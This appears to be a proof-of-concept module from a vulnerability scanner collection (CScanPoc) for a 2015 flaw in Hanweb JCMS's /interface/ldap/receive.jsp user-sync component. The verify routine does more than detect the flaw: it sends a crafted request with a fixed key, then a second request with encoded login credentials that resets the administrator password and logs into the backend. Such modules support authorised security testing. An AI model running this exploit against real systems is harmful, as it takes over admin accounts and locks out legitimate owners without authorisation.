# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0005'  # 平台漏洞编号，留空
    name = '大汉JCMS 重置管理员密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-09-26'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb）/interface/ldap/receive.jsp这个组件，是一个不同大汉系统间，同步用户的通用组件。
        例如：jact系统，需要把jcms用户同步到自己的系统中，这个组件本来就是，用于创建用户的，如果被创建的用户存在的话，就会进行更新操作。

        /interface/ldap/receive.jsp 组件可以被覆盖。
        我们可以使用大汉的加解密库进行任意加解密，覆盖原有密码。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0143528'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '217d22c9-9ab6-40bd-acd8-46587aa21bc2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0143528
            hh = hackhttp.hackhttp()
            arg = self.target
            getdata2 = '/jcms/interface/ldap/receive.jsp?state=S&enckey=key888'
            code, head, res, errcode, _ = hh.http(arg + getdata2)
            if code == 200 and '成功' in res:
                #security_hole(arg + getdata2 + "   :ldap reset")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                getdata3 = '/jcms/interface/ldap/receive.jsp?state=C&result=T&loginuser=BWcCb3FrBBh8bQ==&loginpass=BWcCb3FrBBh8bQ=='
                code, head, res, errcode, _ = hh.http(arg + getdata3)
                if code == 200 and 'oawindow/main.jsp' in res:
                    #security_hole(arg + getdata3 + "   :password reset and Background landing")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
